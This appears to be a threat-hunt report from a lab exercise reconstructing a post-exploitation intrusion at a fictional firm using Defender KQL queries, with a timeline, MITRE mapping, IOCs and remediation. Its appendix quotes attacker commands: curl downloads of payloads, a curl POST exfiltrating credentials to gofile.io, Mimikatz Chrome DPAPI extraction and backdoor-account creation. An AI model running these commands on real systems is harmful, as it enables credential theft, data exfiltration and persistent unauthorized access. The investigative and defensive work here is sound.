![bridge-takeover](images/bridge-takeover.png)

# Threat Hunt Report - Bridge Takeover

- **Hunt Name:** Bridge Takeover - Azuki Import/Export
- **Author:** [Your Name]
- **Date:** 2025-11-25
- **Environment:** Microsoft Defender for Endpoint
- **Hunt Type:** Hypothesis-Driven Threat Hunt
- **Severity:** Critical (Confirmed Data Exfiltration and Persistence)

## Executive Summary

Five days following the initial file server breach, threat actors returned to execute a sophisticated post-exploitation campaign against Azuki Import/Export. The attackers demonstrated advanced operational security and methodical targeting of high-value assets, pivoting from the initially compromised workstation to the CEO's administrative PC.

The attack progression followed a deliberate sequence: lateral movement via RDP to administrative systems, deployment of persistent command and control infrastructure, credential harvesting from multiple sources including browser password stores and local files, comprehensive data collection and staging, and large-scale exfiltration of sensitive business data to anonymous cloud storage.

The threat actors displayed sophisticated understanding of enterprise environments, deploying Meterpreter C2 beacons with custom named pipes, creating hidden backdoor accounts with administrative privileges, systematically searching for and extracting password databases, staging data in legitimate-appearing directories, and exfiltrating financial records, credentials, and master passwords.

**Outcome:**  
- CEO administrative workstation compromised
- Persistent C2 infrastructure established
- Multiple credential stores harvested
- Eight archives of sensitive data exfiltrated
- Hidden administrative backdoor account created
- Master password for password manager extracted

## Hunt Objective & Hypothesis

**Objective:**  
Reconstruct the post-exploitation phase of the Azuki breach to understand how threat actors progressed from initial compromise to widespread data exfiltration, identify persistence mechanisms established for long-term access, and determine the full scope of credential theft and data loss.

**Hypothesis:**  
If threat actors executed a post-exploitation campaign following their initial compromise, endpoint telemetry will reveal: lateral movement to high-value administrative systems via legitimate remote access protocols, deployment of command and control infrastructure for persistent access, systematic credential harvesting from browser stores and local files, methodical data collection and staging operations, establishment of hidden persistence mechanisms, and large-scale exfiltration to anonymous file sharing services.

## Data Sources

| Data Source            | Platform |
|------------------------|----------|
| DeviceProcessEvents    | Microsoft Defender for Endpoint |
| DeviceFileEvents       | Microsoft Defender for Endpoint |
| DeviceNetworkEvents    | Microsoft Defender for Endpoint |
| DeviceRegistryEvents   | Microsoft Defender for Endpoint |
| DeviceLogonEvents      | Microsoft Defender for Endpoint |
| DeviceEvents           | Microsoft Defender for Endpoint |

## Scope

- **Time Range:** `2025-11-25` (post-exploitation phase, five days following initial compromise)
- **Assets in Scope:** Azuki Logistics corporate network infrastructure  
- **Primary Targets:** azuki-logisticspc (source), azuki-adminpc (target)  
- **Compromised Accounts:** yuki.tanaka, yuki.tanaka2 (backdoor)
 
## Methodology

This hunt followed an **attack chain reconstruction approach**:

1. Established investigation scope across all Azuki network devices using device name filters
2. Identified lateral movement to administrative systems through RDP logon analysis
3. Tracked malware download and deployment through network and process telemetry
4. Reconstructed C2 infrastructure establishment via named pipe events
5. Documented credential access activities across multiple sources
6. Traced data collection and staging operations through file events
7. Identified exfiltration activities via network connections and process execution
8. Mapped persistence mechanisms through registry and scheduled task analysis
9. Correlated activities to MITRE ATT&CK framework for comprehensive coverage

The investigation prioritized understanding the attacker's objectives, identifying high-value targets accessed, and quantifying the scope of data loss to inform breach notification and remediation efforts.

## Investigation Timeline

| Phase | Event |
|-------|-------|
| **Phase 1: Lateral Movement** | |
| `2025-11-25T04:06:41.7723198Z` | RDP connection established from compromised workstation (10.1.0.204) to admin PC using yuki.tanaka credentials |
| **Phase 2: C2 Infrastructure Deployment** | |
| `2025-11-25T04:21:11.7917432Z` | Malicious archive downloaded from external hosting (litter.catbox.moe/gfdb9v.7z) |
| `2025-11-25T04:21:32.2579357Z` | Password-protected archive extracted to C:\Windows\Temp\cache\ |
| `2025-11-25T04:21:33.118662Z` | Meterpreter C2 beacon deployed (meterpreter.exe) |
| `2025-11-25T04:24:35.3398583Z` | Named pipe created for C2 communication (msf-pipe-5902) |
| **Phase 3: Persistence Establishment** | |
| `2025-11-25T04:26:15Z` | Hidden backdoor account created via Base64-encoded PowerShell (yuki.tanaka2) |
| `2025-11-25T04:51:23.1513024Z` | Backdoor account elevated to Administrators group |
| **Phase 4: Discovery Operations** | |
| `2025-11-25T04:08:58.5854766Z` | Active RDP sessions enumerated (qwinsta.exe) |
| `2025-11-25T04:09:38.4962517Z` | Domain trust relationships enumerated (nltest.exe /domain_trusts) |
| `2025-11-25T04:10:07.805432Z` | Network connections enumerated (NETSTAT.EXE -ano) |
| `2025-11-25T04:13:45.93614Z` | Password databases searched (where /r C:\Users *.kdbx) |
| `2025-11-25T04:15:57.3989346Z` | Plaintext password file discovered (OLD-Passwords.lnk) |
| **Phase 5: Data Collection** | |
| `2025-11-25T04:37:03.0075513Z` | Banking documents copied to staging directory via Robocopy |
| `2025-11-25T04:39:16.4900877Z` | Eight archives created in staging directory for exfiltration |
| `2025-11-25T04:39:16.4900877Z` | KeePass master password extracted to text file |
| **Phase 6: Credential Access** | |
| `2025-11-25T05:55:34.5280119Z` | Credential theft tool downloaded (m-temp.7z from litter.catbox.moe) |
| `2025-11-25T05:55:54.858525Z` | Chrome browser credentials extracted via DPAPI |
| **Phase 7: Exfiltration** | |
| `2025-11-25T04:41:51.7723427Z` | First archive uploaded to gofile.io (credentials.tar.gz) |
| `2025-11-25T04:41:51Z - ongoing` | Seven additional archives exfiltrated to cloud storage (45.112.123.227) |

## Key Findings

The following findings illustrate the systematic nature of this post-exploitation campaign and the threat actors' focus on credential theft and sensitive data exfiltration.

### Lateral Movement to High-Value Target
- Threat actors leveraged the previously compromised yuki.tanaka account to establish an RDP connection from the logistics workstation (10.1.0.204) to the CEO's administrative PC (azuki-adminpc). This lateral movement occurred at 04:06:41 UTC, demonstrating the attackers' knowledge of organizational structure and target prioritization. The use of legitimate remote access protocols enabled the movement to blend with normal administrative activity.

### Persistent C2 Infrastructure Deployment
- Following successful lateral movement, attackers downloaded a password-protected 7z archive masquerading as a Windows security update (KB5044273-x64.7z) from external file hosting. The archive was extracted to C:\Windows\Temp\cache\ and deployed a Meterpreter C2 beacon (meterpreter.exe). The beacon established communication via a custom named pipe (msf-pipe-5902), providing persistent remote access capability that survives process termination and system reboots.

### Hidden Administrative Backdoor Creation
- Attackers established persistence through a hidden administrative account created via Base64-encoded PowerShell commands. The account "yuki.tanaka2" was created with a strong password (B@ckd00r2024!) and elevated to the Administrators group. The use of obfuscated PowerShell and naming convention similar to legitimate users demonstrates intent to avoid detection during routine account audits.

### Systematic Credential Harvesting
- Multiple credential sources were targeted including browser password stores, local password files, and password manager databases. The attackers specifically searched for KeePass databases (.kdbx files), discovered a plaintext password file (OLD-Passwords.lnk), downloaded specialized credential theft tooling (Mimikatz variant), and extracted Chrome saved passwords using DPAPI. The KeePass master password was successfully extracted, providing access to all stored organizational credentials.

### Organized Data Collection and Staging
- Sensitive data was methodically collected and organized in a staging directory (C:\ProgramData\Microsoft\Crypto\staging) that mimicked legitimate Windows service paths. Banking documents were copied using Robocopy with specific flags for reliability (/E /R:1 /W:1 /NP). Eight distinct archives were created containing financial records, credentials, password databases, and configuration files totaling significant organizational data loss.

### Large-Scale Data Exfiltration
- All staged archives were exfiltrated to the anonymous file sharing service gofile.io using curl POST requests. The exfiltration occurred over HTTPS to the IP address 45.112.123.227, making network-based detection challenging. The use of form-based HTTP uploads with the multipart/form-data format enabled efficient transfer of large archive files while blending with legitimate web traffic.

## MITRE ATT&CK Mapping

The observed behaviors were mapped to MITRE ATT&CK techniques to contextualize the attack within established adversary tradecraft and support detection engineering efforts.

| Tactic              | Technique                                | ID        |
|---------------------|-------------------------------------------|-----------|
| Lateral Movement    | Remote Services - Remote Desktop Protocol | T1021.001 |
| Credential Access   | Valid Accounts - Domain Accounts          | T1078.002 |
| Command and Control | Ingress Tool Transfer                     | T1105     |
| Defense Evasion     | Obfuscated Files or Information           | T1027     |
| Execution           | Command and Scripting Interpreter         | T1059.001 |
| Command and Control | Application Layer Protocol                | T1071     |
| Persistence         | Create Account - Local Account            | T1136.001 |
| Privilege Escalation| Valid Accounts - Local Accounts           | T1078.003 |
| Discovery           | System Owner/User Discovery               | T1033     |
| Discovery           | Domain Trust Discovery                    | T1482     |
| Discovery           | System Network Connections Discovery      | T1049     |
| Credential Access   | Unsecured Credentials - Credentials In Files | T1552.001 |
| Credential Access   | Credentials from Password Stores          | T1555.005 |
| Credential Access   | Credentials from Web Browsers             | T1555.003 |
| Collection          | Data Staged - Local Data Staging          | T1074.001 |
| Collection          | Automated Collection                      | T1119     |
| Collection          | Archive Collected Data                    | T1560.001 |
| Exfiltration        | Exfiltration Over Web Service             | T1567     |
| Exfiltration        | Exfiltration to Cloud Storage             | T1567.002 |

## Indicators of Compromise (IOCs)

The following indicators were identified during the investigation and may be used for threat hunting, scoping additional systems, and detection rule development.

| Type                    | Value |
|-------------------------|-------|
| Hostname (Source)       | azuki-logisticspc |
| Hostname (Target)       | azuki-adminpc |
| Account Name            | yuki.tanaka, yuki.tanaka2 |
| C2 Payload              | meterpreter.exe |
| C2 Named Pipe           | \Device\NamedPipe\msf-pipe-5902 |
| Malicious Archive       | KB5044273-x64.7z, m-temp.7z |
| Credential Tool         | m.exe (Mimikatz variant) |
| Password File           | OLD-Passwords.lnk |
| Master Password File    | KeePass-Master-Password.txt |
| Staging Directory       | C:\ProgramData\Microsoft\Crypto\staging |
| IP Address (Source)     | 10.1.0.204 |
| IP Address (Target)     | 10.1.0.102 |
| IP Address (Exfil)      | 45.112.123.227 |
| External URLs           | https://litter.catbox.moe/gfdb9v.7z, https://litter.catbox.moe/mt97cj.7z |
| Exfiltration Service    | gofile.io, store1.gofile.io |

## Response Actions

- Isolate azuki-adminpc and azuki-logisticspc from the network immediately
- Reset credentials for yuki.tanaka account and all administrative accounts
- Delete backdoor account yuki.tanaka2 from all systems
- Terminate Meterpreter C2 beacon process (meterpreter.exe)
- Remove C2 infrastructure from C:\Windows\Temp\cache\
- Reset KeePass master password and rotate all stored credentials
- Preserve forensic images of both affected systems before recovery
- Review all RDP access logs for additional unauthorized sessions
- Implement network segmentation to restrict lateral movement
- Disable password storage in web browsers via Group Policy
- Conduct organization-wide password reset with MFA enforcement
- Review data exfiltrated to gofile.io and assess breach notification requirements
- Engage with legal counsel and consider law enforcement notification
- Conduct comprehensive threat hunt for additional compromised systems

## Detection Gaps & Improvements

The attack succeeded due to multiple detection and prevention gaps. RDP lateral movement from user workstations to administrative systems was not alerted. Malware downloads from file sharing services occurred without URL filtering or inspection. Base64-encoded PowerShell commands executed without behavioral analysis triggering alerts. Named pipe creation by non-standard processes was not monitored. Credential theft tooling executed without application whitelisting controls. Large data staging operations in ProgramData did not generate anomaly alerts. Bulk file uploads to cloud storage services were not detected or blocked.

**Improvements:**
- Deploy EDR/SIEM alerting for RDP connections from user workstations to administrative systems
- Implement DNS filtering and web proxy controls to block known malicious file hosting domains
- Enable PowerShell script block logging and create alerts for Base64 encoding patterns
- Deploy behavioral analytics for named pipe creation by unusual processes
- Implement application whitelisting to prevent unauthorized tool execution
- Create file system monitoring for unusual data staging in ProgramData and Temp directories
- Deploy Data Loss Prevention (DLP) with cloud storage service monitoring
- Implement network-based anomaly detection for large volume uploads
- Require MFA for all RDP and administrative access
- Deploy Privileged Access Workstations (PAWs) for administrative activities
- Enforce browser password manager restrictions via Group Policy
- Implement credential guard and Windows Defender Credential Guard

## Lessons Learned

- User workstations should not have direct RDP access to administrative systems
- Password-protected archives bypass basic content inspection and require behavioral analysis
- Base64 encoding is a common obfuscation technique that must be monitored
- Named pipes provide covert C2 channels that evade network-based detection
- Plaintext password files represent critical security failures with cascading impact
- Password manager master passwords must be protected with MFA and not stored in files
- Data staging in system directories can evade basic file integrity monitoring
- Cloud storage services provide convenient exfiltration paths that require DLP controls
- Time between initial compromise and post-exploitation provides detection opportunity
- Credential stores in browsers represent high-value targets requiring protective controls

<details>
<summary><h2><strong>Appendix: Supporting Queries and Evidence (click to expand)</strong></h2></summary>

The following sections document the investigative queries used during the hunt, along with the corresponding evidence observed in endpoint telemetry to support each finding.

### Finding: Lateral Movement Source IP

```kql
let start = datetime(2025-11-24);
let end   = datetime(2025-12-10);
DeviceLogonEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-admin"
| where ActionType contains "succ"
| where isnotempty(RemoteIP)
| project TimeGenerated, DeviceName, AccountName, ActionType, LogonType, RemoteIP, RemoteDeviceName
| order by TimeGenerated desc
```

**Evidence observed:**  
`10.1.0.204`

**Why it matters:**  
Identifies the compromised source system initiating lateral movement to high-value targets.

---

### Finding: Compromised Account for Lateral Movement

```kql
let start = datetime(2025-11-24);
let end   = datetime(2025-12-10);
DeviceLogonEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-admin"
| where ActionType contains "succ"
| where isnotempty(RemoteIP)
| project TimeGenerated, DeviceName, AccountName, ActionType, LogonType, RemoteIP, RemoteDeviceName
| order by TimeGenerated desc
```

**Evidence observed:**  
`yuki.tanaka` (timestamp: 2025-11-25T04:06:41.7723198Z)

**Why it matters:**  
Account compromised during initial breach was reused for lateral movement, demonstrating credential reuse across attack phases.

---

### Finding: Target Device Name

```kql
let start = datetime(2025-11-24);
let end   = datetime(2025-12-10);
DeviceLogonEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-admin"
| where ActionType contains "succ"
| where isnotempty(RemoteIP)
| project TimeGenerated, DeviceName, AccountName, ActionType, LogonType, RemoteIP, RemoteDeviceName
| order by TimeGenerated desc
```

**Evidence observed:**  
`azuki-adminpc`

**Why it matters:**  
Administrative PC naming suggests high-value target with privileged access.

---

### Finding: Malware Hosting Service

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceNetworkEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-admin"
| where InitiatingProcessAccountName contains "yuki.tanaka"
| where isnotempty(RemoteUrl)
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by TimeGenerated desc
```

**Evidence observed:**  
`litter.catbox.moe`

**Why it matters:**  
Anonymous file hosting service used to stage malware infrastructure.

---

### Finding: Malicious Archive Download

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "curl"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated desc
```

**Evidence observed:**  
`"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`

**Why it matters:**  
File masquerades as Windows security update to evade suspicion during download.

---

### Finding: Archive Extraction Command

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "7z"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated desc
```

**Evidence observed:**  
`"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`

**Why it matters:**  
Password-protected archive evades basic content inspection while legitimate tool bypasses application controls.

---

### Finding: C2 Beacon Filename

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceFileEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-admin"
| where InitiatingProcessCommandLine has "cache"
| order by TimeGenerated desc
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileOriginUrl
```

**Evidence observed:**  
`meterpreter.exe`

**Why it matters:**  
Identifies Metasploit Framework payload providing persistent command and control capability.

---

### Finding: Named Pipe for C2 Communication

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-admin"
| where ActionType == "NamedPipeEvent"
| where InitiatingProcessAccountName == "yuki.tanaka"
| where InitiatingProcessFileName == "meterpreter.exe"
| order by TimeGenerated desc
| project TimeGenerated, DeviceName, ActionType, AdditionalFields, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileOriginUrl
```

**Evidence observed:**  
`\Device\NamedPipe\msf-pipe-5902` (requires JSON parsing of AdditionalFields)

**Why it matters:**  
Named pipe provides covert inter-process communication channel for C2 framework.

---

### Finding: Obfuscated Account Creation Command

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "encode"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated desc
```

**Evidence observed (decoded):**  
`net user yuki.tanaka2 B@ckd00r2024! /add`

**Why it matters:**  
Base64 encoding obfuscates malicious intent from basic string matching and log analysis.

---

### Finding: Backdoor Account Name

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "encode"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated desc
```

**Evidence observed:**  
`yuki.tanaka2`

**Why it matters:**  
Naming pattern mimics legitimate account to evade casual inspection during account audits.

---

### Finding: Privilege Escalation Command

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "encode"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated desc
```

**Evidence observed (decoded):**  
`net localgroup Administrators yuki.tanaka2 /add`

**Why it matters:**  
Backdoor account elevated to administrators providing full system control.

---

### Finding: RDP Session Enumeration

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "qu" or ProcessCommandLine contains "qw"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Evidence observed:**  
`qwinsta.exe`

**Why it matters:**  
Session enumeration reveals active users and helps attackers avoid detection.

---

### Finding: Domain Trust Enumeration

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "trust"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Evidence observed:**  
`"nltest.exe" /domain_trusts /all_trusts`

**Why it matters:**  
Trust relationships reveal potential lateral movement paths across organizational boundaries.

---

### Finding: Network Connection Enumeration

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "netstat"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Evidence observed:**  
`"NETSTAT.EXE" -ano`

**Why it matters:**  
Network connection mapping identifies active sessions and listening services.

---

### Finding: Password Database Search

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "kdbx"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Evidence observed:**  
`where /r C:\Users *.kdbx`

**Why it matters:**  
KeePass database search indicates targeting of enterprise password management infrastructure.

---

### Finding: Plaintext Password File Discovery

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceFileEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-admin"
| where FileName has "txt" or FileName contains "lnk"
| order by TimeGenerated desc
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileOriginUrl
```

**Evidence observed:**  
`OLD-Passwords.lnk`

**Why it matters:**  
Plaintext password storage represents critical security failure with immediate exploitation value.

---

### Finding: Data Staging Directory

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceFileEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-admin"
| where FileName has "zip" or FileName contains "tar"
| order by TimeGenerated desc
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileOriginUrl
```

**Evidence observed:**  
`C:\ProgramData\Microsoft\Crypto\staging`

**Why it matters:**  
Staging path mimics legitimate Windows directories to evade file integrity monitoring.

---

### Finding: Banking Document Collection

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "staging"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Evidence observed:**  
`"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP`

**Why it matters:**  
Robocopy provides reliable bulk file copying with retry logic ideal for data theft operations.

---

### Finding: Archive Creation Count

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceFileEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-admin"
| where FileName has "zip" or FileName contains "tar"
| where FolderPath contains "staging"
| order by TimeGenerated desc
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileOriginUrl
| summarize num = count() by FolderPath
```

**Evidence observed:**  
`8 archives`

**Why it matters:**  
Multiple archives indicate systematic data collection across different data categories.

---

### Finding: Credential Theft Tool Download

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "curl"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Evidence observed:**  
`"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`

**Why it matters:**  
Specialized credential theft tooling downloaded for browser password extraction.

---

### Finding: Browser Credential Theft

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "chrome"
| where InitiatingProcessCommandLine contains "powershell"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Evidence observed:**  
`"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`

**Why it matters:**  
Mimikatz DPAPI module extracts Chrome saved passwords without triggering LSASS-based detections.

---

### Finding: Data Exfiltration Command

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "post"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Evidence observed:**  
`"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`

**Why it matters:**  
Form-based HTTP upload provides simple, reliable exfiltration that blends with web traffic.

---

### Finding: Exfiltration Service Domain

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine contains "post"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Evidence observed:**  
`gofile.io`

**Why it matters:**  
Anonymous file sharing service provides temporary storage with self-destructing links.

---

### Finding: Exfiltration Server IP

```kql
let start = datetime('2025-11-25T04:41:51.7723427Z');
let end   = datetime(2025-12-10);
DeviceNetworkEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-admin"
| where InitiatingProcessAccountName contains "yuki.tanaka"
| project TimeGenerated, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by TimeGenerated asc
```

**Evidence observed:**  
`45.112.123.227`

**Why it matters:**  
IP address enables network-layer blocking when domain-based controls fail.

---

### Finding: Master Password Extraction

```kql
let start = datetime('2025-11-25T04:06:41.7723198Z');
let end   = datetime(2025-12-10);
DeviceFileEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "azuki-admin"
| where FileName has "zip" or FileName contains "tar"
| where FolderPath contains "staging"
| order by TimeGenerated desc
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileOriginUrl
```

**Evidence observed:**  
`KeePass-Master-Password.txt`

**Why it matters:**  
Master password provides access to all organizational credentials stored in password manager.

</details>
